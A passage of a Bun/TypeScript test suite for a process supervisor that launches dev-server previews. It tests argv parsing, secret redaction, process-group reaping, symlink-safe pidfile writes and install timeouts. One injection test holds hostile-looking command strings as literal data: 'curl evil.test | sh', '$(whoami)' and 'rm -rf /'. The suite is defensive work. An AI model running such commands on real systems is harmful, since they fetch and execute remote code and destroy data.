import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawn, spawnSync } from "node:child_process";
import { config } from "../src/config.ts";
import { resetNotices, notices } from "../src/notices.ts";
import {
  _resetPreviewsForTest, beginPreview, expandPlaceholders, getPreview, installPreviewShutdown, isPreviewing,
  parsePreviewCommand, parseStarttime, pickPort, previewCommand, previewTail, reapOrphans, redactCommand,
  redactedResolution, resolvePreview, startPreview, startPreviewSweep, stopPreview, sweepOncePreviews,
} from "../src/preview.ts";
import { bus } from "../src/bus.ts";
import type { Project, Task } from "../src/types.ts";

const FIXTURE = join(import.meta.dir, "fixtures", "fake-dev-server.ts");

// ─────────────────────────────────────────────────────────────────────────────
// Pure
// ─────────────────────────────────────────────────────────────────────────────

describe("parsePreviewCommand", () => {
  test("splits a string on whitespace", () => {
    expect(parsePreviewCommand("pnpm dev --port {port}")).toEqual({
      env: {}, argv: ["pnpm", "dev", "--port", "{port}"],
    });
  });

  test("leading NAME=VALUE tokens become child env", () => {
    expect(parsePreviewCommand("PORT=3000 HOST=127.0.0.1 npm start")).toEqual({
      env: { PORT: "3000", HOST: "127.0.0.1" }, argv: ["npm", "start"],
    });
  });

  test("an assignment AFTER the program is an argument, not env", () => {
    const { env, argv } = parsePreviewCommand("npm start FOO=bar");
    expect(env).toEqual({});
    expect(argv).toEqual(["npm", "start", "FOO=bar"]);
  });

  // The array form is the whole reason it exists: whitespace-splitting a string
  // would turn this into four arguments and the dev server would print usage.
  test("the array form preserves an argument containing spaces", () => {
    const { argv } = parsePreviewCommand(["pnpm", "dev", "--define", "API=https://x.test/a b"]);
    expect(argv).toEqual(["pnpm", "dev", "--define", "API=https://x.test/a b"]);
  });

  test("env assignments are honoured in the array form too", () => {
    expect(parsePreviewCommand(["PORT=1", "npm", "start"])).toEqual({
      env: { PORT: "1" }, argv: ["npm", "start"],
    });
  });

  // SECURITY, not parsing: there is no `sh -c`, so shell metacharacters must reach
  // the child as literal argv entries. If this ever starts interpreting them, a
  // projects.json typo becomes a command-injection surface.
  test("shell metacharacters stay literal argv tokens", () => {
    const { argv } = parsePreviewCommand("npm run dev && curl evil.test | sh");
    expect(argv).toEqual(["npm", "run", "dev", "&&", "curl", "evil.test", "|", "sh"]);
    expect(parsePreviewCommand("npm run $(whoami)").argv).toContain("$(whoami)");
    // `;` stays glued to the token it was typed against — proof it was never
    // treated as a statement separator.
    expect(parsePreviewCommand("npm run dev; rm -rf /").argv).toEqual(["npm", "run", "dev;", "rm", "-rf", "/"]);
  });

  test("blank input yields no program", () => {
    expect(parsePreviewCommand("   ").argv).toEqual([]);
    expect(parsePreviewCommand([]).argv).toEqual([]);
  });
});

describe("expandPlaceholders", () => {
  test("substitutes {port} in argv and in env values", () => {
    expect(expandPlaceholders(["--port", "{port}"], { port: 8788 })).toEqual(["--port", "8788"]);
    expect(expandPlaceholders({ PORT: "{port}" }, { port: 8788 })).toEqual({ PORT: "8788" });
  });

  test("substitutes every occurrence, including inside a larger string", () => {
    expect(expandPlaceholders(["http://127.0.0.1:{port}/{port}"], { port: 90 })).toEqual(["http://127.0.0.1:90/90"]);
  });

  test("leaves unknown placeholders alone", () => {
    expect(expandPlaceholders(["--base", "{base}"], { port: 1 })).toEqual(["--base", "{base}"]);
  });
});

describe("pickPort", () => {
  const free = () => true;

  test("returns the first port that is neither reserved nor bound", () => {
    expect(pickPort([8788, 8789], new Set(), free)).toBe(8788);
    expect(pickPort([8788, 8789], new Set([8788]), free)).toBe(8789);
  });

  test("skips ports the probe says are busy", () => {
    expect(pickPort([8788, 8789], new Set(), (p) => p !== 8788)).toBe(8789);
  });

  test("null when the pool is exhausted", () => {
    expect(pickPort([8788], new Set([8788]), free)).toBeNull();
    expect(pickPort([8788, 8789], new Set(), () => false)).toBeNull();
    expect(pickPort([], new Set(), free)).toBeNull();
  });

  test("never returns a port outside the pool", () => {
    for (const taken of [new Set<number>(), new Set([8788])]) {
      const p = pickPort([8788, 8789], taken, free);
      if (p !== null) expect([8788, 8789]).toContain(p);
    }
  });
});

// Field 22 is NOT split(" ")[21]. Field 2 is `comm` in parens and may itself
// contain spaces and parens. A wrong parse either never reaps (a port leak) or —
// worse — matches wrongly and SIGKILLs an unrelated process.
describe("parseStarttime", () => {
  // Fields 3..21 then starttime at 22. Once "pid (comm)" is consumed, index 0 is
  // field 3, so starttime lands at index 19: state,ppid,pgrp,session,tty,tpgid,flags
  // (7 tokens, indices 0-6) then 12 filler fields (7-18), then starttime (19).
  const stat = (comm: string) =>
    `1234 (${comm}) S 1 1234 1234 0 -1 4194304 ` + Array.from({ length: 12 }, (_, i) => i).join(" ") + " 987654 " + "0 ".repeat(30);

  test("reads field 22 for an ordinary comm", () => {
    expect(parseStarttime(stat("node"))).toBe(987654);
  });

  test("survives a comm containing spaces and parentheses", () => {
    expect(parseStarttime(stat("my app (dev)"))).toBe(987654);
    expect(parseStarttime(stat("weird ) name"))).toBe(987654);
  });

  test("null on junk rather than a wrong number", () => {
    expect(parseStarttime("")).toBeNull();
    expect(parseStarttime("no parens here")).toBeNull();
    expect(parseStarttime("1234 (node) S")).toBeNull();
  });

  // Proves the parse against the real format rather than only our fixture.
  test("agrees with this process's own /proc entry", () => {
    if (!existsSync(`/proc/${process.pid}/stat`)) return; // not Linux
    const v = parseStarttime(readFileSync(`/proc/${process.pid}/stat`, "utf8"));
    expect(typeof v).toBe("number");
    expect(v).toBeGreaterThan(0);
  });
});

// The GET that serves this is UNGATED, and a denylist of TOKEN|SECRET|KEY|PASS
// misses DATABASE_URL, SENTRY_DSN, STRIPE_SK and npm_config__auth.
describe("redactCommand", () => {
  test("shows env names but never their values", () => {
    const out = redactCommand(["pnpm", "dev"], { API_KEY: "sk-live-abcdef", DATABASE_URL: "postgres://u:pw@h/db" });
    expect(out).toContain("API_KEY=[set]");
    expect(out).toContain("DATABASE_URL=[set]");
    expect(out).not.toContain("sk-live-abcdef");
    expect(out).not.toContain("postgres://u:pw@h/db");
  });

  test("keeps the program and its flags legible", () => {
    expect(redactCommand(["pnpm", "dev", "--port", "8788"], {})).toBe("pnpm dev --port 8788");
  });

  test("scrubs daemon secrets that leaked into argv", () => {
    expect(redactCommand(["x", `--u=http://h/hooks?token=${config.hookToken}`], {})).not.toContain(config.hookToken);
  });
});

describe("resolvePreview", () => {
  const base: Project = { id: "shop", path: "/srv/shop", label: "shop" };

  test("a configured command resolves", () => {
    const r = resolvePreview({ ...base, preview: "pnpm dev", install: "pnpm i" });
    expect(r).toEqual({ ok: true, preview: "pnpm dev", install: "pnpm i" });
  });

  // Never a silent failure: the reason IS the fix, ready to paste.
  test("no command explains what to add, with the project's real id and path", () => {
    const r = resolvePreview(base);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error("unreachable");
    expect(r.reason).toContain("projects.json");
    expect(r.reason).toContain('"id": "shop"');
    expect(r.reason).toContain('"path": "/srv/shop"');
    expect(r.reason).toContain("{port}");
  });

  test("an unknown project is refused rather than guessed at", () => {
    expect(resolvePreview(undefined).ok).toBe(false);
  });
});

// The Resolution itself must NEVER be serialised: it carries projects.json's
// `preview`/`install` verbatim, and both accept leading NAME=VALUE tokens — so the
// UNGATED GET that shows the drawer "what command runs" would have published every
// env VALUE an operator put there (a DATABASE_URL, an npm_config__auth). This is
// the function that stands between the two, so it gets its own tests rather than
// being covered only incidentally by the route.
describe("redactedResolution", () => {
  test("env values from projects.json are never serialised, in either field", () => {
    const out = redactedResolution({
      ok: true,
      preview: "DATABASE_URL=postgres://u:pw@h/db pnpm dev --port {port}",
      install: ["NPM_TOKEN=npm_abcdefghijkl", "npm", "ci"],
    });
    expect(out.preview).toContain("DATABASE_URL=[set]");
    expect(out.preview).toContain("pnpm dev --port {port}"); // still answers "what runs"
    expect(out.preview).not.toContain("postgres://u:pw@h/db");
    expect(out.install).toContain("NPM_TOKEN=[set]");
    expect(out.install).not.toContain("npm_abcdefghijkl");
  });

  test("no install configured contributes no field at all", () => {
    expect(redactedResolution({ ok: true, preview: "pnpm dev" })).toEqual({ preview: "pnpm dev" });
  });

  // A project with nothing configured still gets a serialisable answer — the route
  // sends the *reason* separately, and an undefined here would render "undefined".
  test("an unresolved project yields an empty command, not a leak or a throw", () => {
    expect(redactedResolution({ ok: false, reason: "unknown project" })).toEqual({ preview: "" });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Lifecycle — real processes, against the fixture
// ─────────────────────────────────────────────────────────────────────────────

describe("the supervisor", () => {
  let wt: string;
  let savedPorts: number[];
  let savedReady: number;
  let savedTtl: number;
  let savedInstall: number;

  const project = (over: Partial<Project> = {}): Project => ({ id: "p", path: wt, label: "p", ...over });
  const task = (id = "t_pv"): Task => ({
    id, project: "p", title: "t", prompt: "p", branch: "b", worktree: wt,
    tmux: null, sessionId: null, status: "done", phase: "done", pendingQuestion: null,
    lastActivity: Date.now(), createdAt: Date.now(), error: null,
    planReviews: { ceo: null, design: null, eng: null },
    pipeline: false, step: 0, stepSkillSeen: false, pipelineMissed: 0,
  });
  /** The fixture, as a preview command. `bun <fixture>` is argv, so it also proves
   *  the no-shell path handles a real program. */
  const fixtureCmd = (...extra: string[]) => ["bun", FIXTURE, ...extra];

  beforeEach(() => {
    wt = mkdtempSync(join(tmpdir(), "agentdeck-pv-wt-"));
    // A populated node_modules by default, so the install branch is opt-in per test.
    mkdirSync(join(wt, "node_modules"), { recursive: true });
    savedPorts = config.preview.ports;
    savedReady = config.preview.readyTimeoutMs;
    savedTtl = config.preview.ttlMs;
    savedInstall = config.preview.installTimeoutMs;
    // Ports well clear of the documented default so a developer running the daemon
    // while the suite runs doesn't collide with their own previews.
    config.preview.ports = [18788, 18789];
    config.preview.readyTimeoutMs = 8_000;
    resetNotices();
  });

  afterEach(async () => {
    for (const id of ["t_pv", "t_pv2", "t_pv3"]) await stopPreview(id).catch(() => {});
    _resetPreviewsForTest();
    config.preview.ports = savedPorts;
    config.preview.readyTimeoutMs = savedReady;
    config.preview.ttlMs = savedTtl;
    config.preview.installTimeoutMs = savedInstall;
    rmSync(wt, { recursive: true, force: true });
  });

  test("a listening command reaches ready and takes a pool port", async () => {
    const st = await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
    expect(st.status).toBe("ready");
    expect(config.preview.ports).toContain(st.port);
    expect(isPreviewing("t_pv")).toBe(true);
    expect(previewCommand("t_pv")).toContain("fake-dev-server");
  });

  // Fast, not after the readiness timeout: the operator should not wait 60s to be
  // told the thing died in 50ms.
  test("a command that exits immediately fails fast, carrying its stderr", async () => {
    config.preview.readyTimeoutMs = 30_000; // would dominate if we waited for it
    const started = Date.now();
    await expect(
      startPreview(task(), project({ preview: fixtureCmd("--stderr", "boom-cannot-find-module", "--exit", "1") })),
    ).rejects.toThrow(/boom-cannot-find-module/);
    expect(Date.now() - started).toBeLessThan(10_000);
    expect(getPreview("t_pv")?.status).toBe("failed");
    expect(getPreview("t_pv")?.error).toContain("boom-cannot-find-module");
  });

  test("a command that never listens fails on the readiness timeout", async () => {
    config.preview.readyTimeoutMs = 1_200;
    await expect(
      startPreview(task(), project({ preview: fixtureCmd() })),
    ).rejects.toThrow(/did not listen/);
    expect(getPreview("t_pv")?.status).toBe("failed");
  });

  // THE DRAIN TEST. The first version asserted only that a flooding child reached
  // ready — which mutation testing showed stays true with the stdout handler
  // deleted, because Bun's child_process shim does not block the child on a full
  // pipe the way the C-level 64KiB buffer would. So assert the thing that is
  // actually ours: that the supervisor CONSUMED the stream. The marker is written
  // after the flood, so it can only be in the tail if everything before it was read.
  test("the supervisor consumes the child's stdout, not just its stderr", async () => {
    const st = await startPreview(task(), project({
      preview: fixtureCmd("--flood", "400000", "--marker", "drained-ok", "--port", "{port}"),
    }));
    expect(st.status).toBe("ready");
    expect(previewTail("t_pv")).toContain("drained-ok");
  });

  // THE GRANDCHILD TEST. `npm run dev` is a wrapper that forks the real server and
  // waits; child.kill() reaps only the wrapper and leaves the port held.
  test("stopping reaps the whole process group and frees the port", async () => {
    const cmd = ["sh", "-c", `bun ${FIXTURE} --port {port} & wait`];
    const st = await startPreview(task(), project({ preview: cmd }));
    expect(st.status).toBe("ready");
    const port = st.port;

    await stopPreview("t_pv");
    expect(isPreviewing("t_pv")).toBe(false);

    // The port is genuinely free again — the assertion the wrapper would fail.
    const probe = Bun.listen({ hostname: "127.0.0.1", port, socket: { data() {} } });
    probe.stop(true);
    // And nothing from the fixture survives.
    const alive = spawnSync("pgrep", ["-f", `${FIXTURE} --port ${port}`], { encoding: "utf8" });
    expect(alive.stdout.trim()).toBe("");
  });

  test("two rapid starts yield one child, not a race for the port", async () => {
    const p = project({ preview: fixtureCmd("--delay", "300", "--port", "{port}") });
    const [a, b] = await Promise.all([startPreview(task(), p), startPreview(task(), p)]);
    expect(a.port).toBe(b.port);
    expect(a.startedAt).toBe(b.startedAt); // same entry, not two
  });

  test("starting an already-ready preview returns the same entry", async () => {
    const p = project({ preview: fixtureCmd("--port", "{port}") });
    const first = await startPreview(task(), p);
    const again = await startPreview(task(), p);
    expect(again.port).toBe(first.port);
    expect(again.startedAt).toBe(first.startedAt);
  });

  test("pool exhaustion names the running previews", async () => {
    config.preview.ports = [18790]; // one slot
    const p = project({ preview: fixtureCmd("--port", "{port}") });
    await startPreview(task("t_pv"), p);
    await expect(startPreview(task("t_pv2"), p)).rejects.toThrow(/t_pv/);
    await expect(startPreview(task("t_pv2"), p)).rejects.toThrow(/stop one first/);
  });

  test("an unconfigured project explains what to add instead of failing silently", async () => {
    await expect(startPreview(task(), project())).rejects.toThrow(/projects\.json/);
    expect(isPreviewing("t_pv")).toBe(false); // no port burned on a config error
  });

  // THE ENV DELIVERY TEST. parsePreviewCommand and expandPlaceholders are unit-tested
  // above, but both are pure — they prove the PARSE, never the hand-off. This command
  // carries no --port at all, so the fixture can only be listening because `PORT=18788`
  // was parsed out, {port}-expanded and actually reached spawn's `env`. Drop the
  // `...env` spread from spawnDetached and every pure test above stays green while the
  // documented `PORT={port} npm start` form silently stops working.
  test("a parsed NAME=VALUE token is really delivered to the child's environment", async () => {
    const st = await startPreview(task(), project({ preview: ["PORT={port}", "bun", FIXTURE] }));
    expect(st.status).toBe("ready");
    expect(config.preview.ports).toContain(st.port);
  });

  // The child's output is SERVED: it becomes the entry's error, which rides the
  // WebSocket to every open dashboard and is read back by the UNGATED GET. A dev
  // server inherits the daemon's environment, and plenty of them echo a failing
  // request URL or dump process.env on a boot error — so without the scrub, one
  // crash publishes the daemon's own tokens to anything that can reach the port.
  test("a secret the child prints to stderr is redacted before it is served", async () => {
    const leak = `boot failed: POST http://h/hooks?token=${config.hookToken} (dash ${config.dashboardToken})`;
    await expect(
      startPreview(task(), project({ preview: fixtureCmd("--stderr", leak, "--exit", "1") })),
    ).rejects.toThrow(/boot failed/);
    const err = getPreview("t_pv")?.error ?? "";
    expect(err).toContain("boot failed");        // the operator still gets the cause
    expect(err).toContain("[redacted]");
    expect(err).not.toContain(config.hookToken);
    expect(err).not.toContain(config.dashboardToken);
    // The drawer's tail is a second read of the same capture, so it has to be clean too.
    expect(previewTail("t_pv")).not.toContain(config.hookToken);
  });

  // The spawn path has two shapes of "the program isn't there": a synchronous throw
  // and an async `error` event. Only the second happens for ENOENT, and it is the one
  // that would otherwise sit until the 60s readiness timeout with "did not listen" —
  // which sends the operator hunting for a bind address instead of a typo in argv[0].
  test("a preview program that does not exist fails on what happened, not on the timeout", async () => {
    config.preview.readyTimeoutMs = 30_000; // would dominate if the death weren't noticed
    const started = Date.now();
    await expect(
      startPreview(task(), project({ preview: ["/nonexistent/agentdeck-dev-server"] })),
    ).rejects.toThrow(/exited before it listened/);
    expect(Date.now() - started).toBeLessThan(10_000);
    expect(getPreview("t_pv")?.status).toBe("failed");
  });

  // The mirror of the sweep's health check, and the reason that check is not enough on
  // its own: a dev server that CRASHES after it was ready must show as failed within
  // milliseconds (the child's close handler), not up to 30 seconds later when the sweep
  // next runs. Dropping the pidfile record in the same breath is what stops the next
  // boot from SIGTERMing a recycled pid on this task's behalf.
  test("a dev server that exits after it was ready fails immediately and drops its pidfile record", async () => {
    const st = await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}", "--exit-after", "400") }));
    expect(st.status).toBe("ready");
    await new Promise((r) => setTimeout(r, 1_500));
    expect(getPreview("t_pv")?.status).toBe("failed");   // no sweepOncePreviews() call: the close handler did it
    expect(existsSync(join(config.dataDir, "previews.json"))).toBe(false);
  });

  // Every one of these fails FAST and SYNCHRONOUSLY, before any await, because the
  // route turns a throw into a 409 whose message is the fix. Anything that only failed
  // later would reach the operator as a silent 202 and a preview that never appears.
  describe("refusals", () => {
    // Deliberately does NOT name a cause. daemon.ts clears this flag for three
    // different reasons (the env var, a pool colliding with the dashboard port, an
    // off-loopback bind), each with its own notice. Naming one of them sent the
    // operator after the wrong setting — the exact mis-messaging the boot-order
    // move was made to end, surviving on the API path.
    test("a daemon with previews switched off says so without guessing which check did it", () => {
      const saved = config.preview.enabled;
      config.preview.enabled = false;
      try {
        expect(() => beginPreview(task(), project({ preview: fixtureCmd("--port", "{port}") })))
          .toThrow(/previews are disabled on this daemon/);
        expect(() => beginPreview(task(), project({ preview: fixtureCmd("--port", "{port}") })))
          .toThrow(/boot notices/);
        // and it must not assert a cause it cannot know
        try { beginPreview(task(), project({ preview: fixtureCmd() })); } catch (e: any) {
          expect(e.message).not.toContain("AGENTDECK_PREVIEW=false");
        }
        expect(isPreviewing("t_pv")).toBe(false);  // and no entry, so no port is held
      } finally { config.preview.enabled = saved; }
    });

    // `PORT=3000` alone parses cleanly into env with an EMPTY argv. Without this check
    // spawn() is handed `undefined` as its program, which throws from inside the start
    // closure — a `failed` entry holding a pool port instead of a 409 naming the typo.
    test("a preview command that is only NAME=VALUE is refused before a port is taken", () => {
      expect(() => beginPreview(task(), project({ preview: "PORT=3000 HOST=127.0.0.1" })))
        .toThrow(/only NAME=VALUE assignments/);
      expect(isPreviewing("t_pv")).toBe(false);
    });

    test("an install command that is only NAME=VALUE is refused too", async () => {
      rmSync(join(wt, "node_modules"), { recursive: true, force: true });
      await expect(startPreview(task(), project({
        install: "NODE_ENV=production", preview: fixtureCmd("--port", "{port}"),
      }))).rejects.toThrow(/install command for 'p' has no program to run/);
      expect(getPreview("t_pv")?.status).toBe("failed");
    });
  });

  // For REAPING ONLY — but a supervisor that stopped recording live previews would
  // disable orphan reaping silently, and every reapOrphans test above hand-writes the
  // file, so none of them would notice. This is the only test that asserts the writer.
  describe("the pidfile", () => {
    const pidfile = () => join(config.dataDir, "previews.json");

    afterEach(() => { try { rmSync(pidfile()); } catch { /* fine */ } });

    test("a live preview is recorded, and the file is dropped once nothing is running", async () => {
      const st = await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      const records = JSON.parse(readFileSync(pidfile(), "utf8"));
      expect(records).toHaveLength(1);
      expect(records[0].taskId).toBe("t_pv");
      expect(records[0].port).toBe(st.port);
      // The recorded pid must be the live GROUP LEADER, not a stale or invented number:
      // reapOrphans signals `-pid`, so a wrong one is a signal sent to strangers.
      expect(spawnSync("kill", ["-0", String(records[0].pid)]).status).toBe(0);
      // And it must carry a starttime. reapOrphans fails CLOSED on a null one, so a
      // writer that stopped capturing it would leave every orphan unreaped — the port
      // leak this file exists to fix, with the file still being written.
      if (existsSync(`/proc/${records[0].pid}/stat`)) expect(typeof records[0].starttime).toBe("number");

      await stopPreview("t_pv");
      // Not an empty array: an empty file would make the next boot read a record set
      // it has to validate. The file is removed outright.
      expect(existsSync(pidfile())).toBe(false);
    });

    // O_NOFOLLOW, the same hardening the dashboard token has. Both the agent and the
    // previewed dev server run as this uid and can pre-place a link in the data dir,
    // and without the flag the daemon would TRUNCATE whatever it points at — an
    // agent-settings.json, a systemd unit, an authorized_keys — on the next start.
    test("previews.json is never written THROUGH a symlink", async () => {
      const victim = join(wt, "precious.conf");
      writeFileSync(victim, "do-not-truncate\n");
      try { rmSync(pidfile()); } catch { /* fine */ }
      symlinkSync(victim, pidfile());

      const st = await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      // The preview still runs: a pidfile we cannot write costs orphan reaping, never
      // the feature. It is reported instead.
      expect(st.status).toBe("ready");
      expect(readFileSync(victim, "utf8")).toBe("do-not-truncate\n");
      expect(notices().some((n) => n.code === "preview-pidfile")).toBe(true);
    });
  });

  describe("stopping", () => {
    // THE ESCALATION TEST. A dev server that traps SIGTERM (or is wedged in a rebuild)
    // must not be able to keep a pool port forever. The 5s grace is deliberately real
    // time here rather than injected: the thing being asserted is that the timer fires
    // AND that the group is actually dead afterwards.
    test("a child that ignores SIGTERM is escalated to SIGKILL and really dies", async () => {
      const st = await startPreview(task(), project({ preview: fixtureCmd("--ignore-sigterm", "--port", "{port}") }));
      expect(st.status).toBe("ready");

      const t0 = Date.now();
      await stopPreview("t_pv");
      const ms = Date.now() - t0;
      // It really waited the grace window — a resolve before it means the promise
      // settled on something other than the process being gone.
      expect(ms).toBeGreaterThanOrEqual(4_500);
      expect(ms).toBeLessThan(12_000);

      expect(spawnSync("pgrep", ["-f", `${FIXTURE} --ignore-sigterm --port ${st.port}`], { encoding: "utf8" }).stdout.trim()).toBe("");
      const probe = Bun.listen({ hostname: "127.0.0.1", port: st.port, socket: { data() {} } });
      probe.stop(true);
    }, 20_000);

    // `stopping` is not a UI nicety: the port stays BOUND for the whole grace window,
    // so handing it to a new preview makes that child die on EADDRINUSE and surface as
    // the far less obvious "did not listen in time".
    test("the entry stays registered — port still reserved — until the stop completes", async () => {
      config.preview.ports = [18790];  // one slot, so a reservation leak is visible
      const p = project({ preview: fixtureCmd("--port", "{port}") });
      await startPreview(task("t_pv"), p);

      const done = stopPreview("t_pv");             // deliberately NOT awaited yet
      // Asserted synchronously, before any await, which is the whole window: the entry
      // is what reservedPorts() is built from.
      expect(getPreview("t_pv")?.status).toBe("stopping");
      expect(isPreviewing("t_pv")).toBe(true);
      // A second click on the same task must not start a child on top of the one being
      // killed. The message tells the operator to wait rather than reporting a failure.
      expect(() => beginPreview(task("t_pv"), p)).toThrow(/still shutting down/);
      // And the single slot is not handed to a different task while it is still bound.
      await expect(startPreview(task("t_pv2"), p)).rejects.toThrow(/in use/);

      await done;
      expect(isPreviewing("t_pv")).toBe(false);
      // Released, not leaked: the same slot is immediately reusable. `stopping` is a
      // window, and this is the assertion that proves it closes.
      expect((await startPreview(task("t_pv2"), p)).port).toBe(18790);
    });

    // The install is the LONGEST phase of a preview (minutes), so it is by far the
    // likeliest moment for Stop to be clicked. The bug this replaces: stopPreview found
    // no child yet, resolved, deleted the entry — and the closure carried on installing
    // and then spawned a dev server nothing tracked, holding a pool port until reboot.
    test("a stop during the install kills the installer and never spawns a dev server", async () => {
      rmSync(join(wt, "node_modules"), { recursive: true, force: true });
      config.preview.installTimeoutMs = 60_000;
      const p = project({ install: ["sh", "-c", "sleep 47"], preview: fixtureCmd("--port", "{port}") });

      const started = startPreview(task(), p).then(() => "resolved", () => "aborted");
      await new Promise((r) => setTimeout(r, 500));
      expect(getPreview("t_pv")?.status).toBe("installing");
      const port = getPreview("t_pv")!.port;

      await stopPreview("t_pv");
      expect(await started).toBe("aborted");
      expect(isPreviewing("t_pv")).toBe(false);
      expect(spawnSync("pgrep", ["-f", "sleep 47"], { encoding: "utf8" }).stdout.trim()).toBe("");
      expect(spawnSync("pgrep", ["-f", `${FIXTURE} --port ${port}`], { encoding: "utf8" }).stdout.trim()).toBe("");
      const probe = Bun.listen({ hostname: "127.0.0.1", port, socket: { data() {} } });
      probe.stop(true);
    }, 20_000);

    // Both reachable from the dashboard: Stop on a row whose preview already went away
    // (a stale frame), and a double-click. Neither may throw, and neither may run a
    // second teardown against a pid the first one is already reaping.
    test("stopping something unknown resolves, and a second stop joins the first", async () => {
      await stopPreview("t_never_started");   // must not throw
      await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      const a = stopPreview("t_pv");
      const b = stopPreview("t_pv");
      expect(b).toBe(a);                      // the same promise, not a second teardown
      await a;
      expect(isPreviewing("t_pv")).toBe(false);
    });

    // THE FAR-SIDE ABORT TEST. `aborted` is re-checked on the far side of
    // `await canConnect`, and that second check is the load-bearing one: a stop that
    // landed WHILE the probe was in flight used to be overwritten by the `ready` set
    // just after it — pushing a live "Preview ▸" link to every open dashboard for a
    // port already being torn down, and returning a `ready` PreviewState from a start
    // the stop path believed it had aborted.
    //
    // That window is sub-millisecond in production and unreachable by sleeping, so a
    // SUCCESSFUL Bun.connect is held open for 800ms for the duration of this test. A
    // failed probe still fails at full speed, so the supervisor's loop runs normally
    // until the child listens and is then guaranteed to be suspended, for most of a
    // second, inside a probe that is going to come back true.
    test("a stop landing inside the readiness probe never publishes ready", async () => {
      const realConnect = Bun.connect;
      const seen: string[] = [];
      const record = (id: string) => { if (id === "t_pv") seen.push(getPreview("t_pv")?.status ?? "gone"); };
      (Bun as any).connect = async (opts: any) => {
        const s = await realConnect(opts);              // throws exactly as the real one does
        await new Promise((r) => setTimeout(r, 800));   // …and only a SUCCESS is held open
        return s;
      };
      bus.on("update", record);
      try {
        const started = startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }))
          .then((s) => s.status, () => "aborted");
        const port = getPreview("t_pv")!.port;
        // Wait for the child to be listening — the precondition that makes this the
        // window and not an ordinary stop during `starting`, since from here the
        // supervisor's very next probe succeeds and hangs.
        for (let i = 0; i < 200; i++) {
          const s = await realConnect({ hostname: "127.0.0.1", port, socket: { data() { /* ignore */ }, error() { /* ignore */ } } })
            .then((c: any) => { c.end(); return true; }, () => false);
          if (s) break;
          await new Promise((r) => setTimeout(r, 25));
        }
        await new Promise((r) => setTimeout(r, 300));   // that probe has started, and holds
        expect(getPreview("t_pv")?.status).toBe("starting");

        const stopped = stopPreview("t_pv");
        expect(await started).toBe("aborted");         // not "ready": the stop owns the entry
        await stopped;
      } finally {
        (Bun as any).connect = realConnect;
        bus.off("update", record);
      }
      // And no frame announcing a live preview was ever pushed after the teardown
      // began — that frame is what the board would have rendered as a working link.
      const from = seen.indexOf("stopping");
      expect(from).toBeGreaterThanOrEqual(0);
      expect(seen.slice(from)).not.toContain("ready");
      expect(isPreviewing("t_pv")).toBe(false);
    }, 30_000);

    // THE ENTRY-IDENTITY TEST. The child's close handler must act on its OWN entry, not
    // on whatever entry the taskId points at by then. killCurrentChild resolves on the
    // SIGKILL timer without waiting for `close`, so a stop-then-restart can install a
    // NEW entry for the same task while the OLD child's close is still pending — and
    // the old child then marked the new preview `failed`, with the new entry's output
    // as the explanation.
    //
    // The `setsid`'d grandchild is what makes that ordering deterministic rather than a
    // race: it escapes the process group, so it survives the kill and holds the stdout
    // pipe open, and `close` cannot fire until it exits — seconds after the restart.
    test("the OLD child's close cannot fail the NEW preview for the same task", async () => {
      const t0 = Date.now();
      const first = await startPreview(task(), project({
        preview: ["sh", "-c", `setsid sleep 9 & exec bun ${FIXTURE} --port {port}`],
      }));
      expect(first.status).toBe("ready");

      await stopPreview("t_pv");
      expect(isPreviewing("t_pv")).toBe(false);

      const second = await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      expect(second.status).toBe("ready");
      expect(second.startedAt).not.toBe(first.startedAt);   // genuinely a second entry

      // The grandchild exits, the old child's close finally lands, and it must find
      // that its entry is no longer the registered one and do nothing.
      await new Promise((r) => setTimeout(r, Math.max(0, 10_000 - (Date.now() - t0))));
      expect(getPreview("t_pv")?.status).toBe("ready");
      expect(getPreview("t_pv")?.error).toBeNull();
      expect(getPreview("t_pv")?.startedAt).toBe(second.startedAt);
    }, 60_000);
  });

  describe("node_modules", () => {
    beforeEach(() => rmSync(join(wt, "node_modules"), { recursive: true, force: true }));

    // The normal state of a fresh worktree: `git worktree add` carries tracked
    // files only, and node_modules is gitignored.
    test("absent with no install command names the exact command to run", async () => {
      await expect(
        startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") })),
      ).rejects.toThrow(/no node_modules/);
      const e = getPreview("t_pv");
      expect(e?.error).toContain("npm install");
      expect(e?.error).toContain(wt);
    });

    test("absent with an install command runs it first, then starts", async () => {
      const p = project({
        install: ["sh", "-c", `mkdir -p ${join(wt, "node_modules")}`],
        preview: fixtureCmd("--port", "{port}"),
      });
      const st = await startPreview(task(), p);
      expect(st.status).toBe("ready");
      expect(existsSync(join(wt, "node_modules"))).toBe(true);
    });

    test("a failing install reports its exit code and output", async () => {
      const p = project({
        install: ["sh", "-c", "echo lockfile-mismatch >&2; exit 3"],
        preview: fixtureCmd("--port", "{port}"),
      });
      await expect(startPreview(task(), p)).rejects.toThrow(/install failed \(exit 3\)/);
      expect(getPreview("t_pv")?.error).toContain("lockfile-mismatch");
    });

    test("an install that hangs is killed at the timeout", async () => {
      config.preview.installTimeoutMs = 800;
      const p = project({ install: ["sh", "-c", "sleep 60"], preview: fixtureCmd("--port", "{port}") });
      await expect(startPreview(task(), p)).rejects.toThrow(/install timed out/);
    });
  });

  describe("the sweep", () => {
    // The sweep fires stops WITHOUT awaiting them: each can take the full SIGTERM
    // grace, and a pool-wide TTL expiry would otherwise run minutes against a 30s
    // interval and stack passes. So the sweep's contract is "the stop is under way",
    // not "the stop is finished" — assert the transition, then that it completes.
    test("a preview past its TTL is stopped", async () => {
      config.preview.ttlMs = 50;
      await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      await new Promise((r) => setTimeout(r, 80));
      await sweepOncePreviews();
      expect(getPreview("t_pv")?.status ?? "gone").toMatch(/stopping|gone/);
      await stopPreview("t_pv");            // joins the in-flight stop
      expect(isPreviewing("t_pv")).toBe(false);
    });

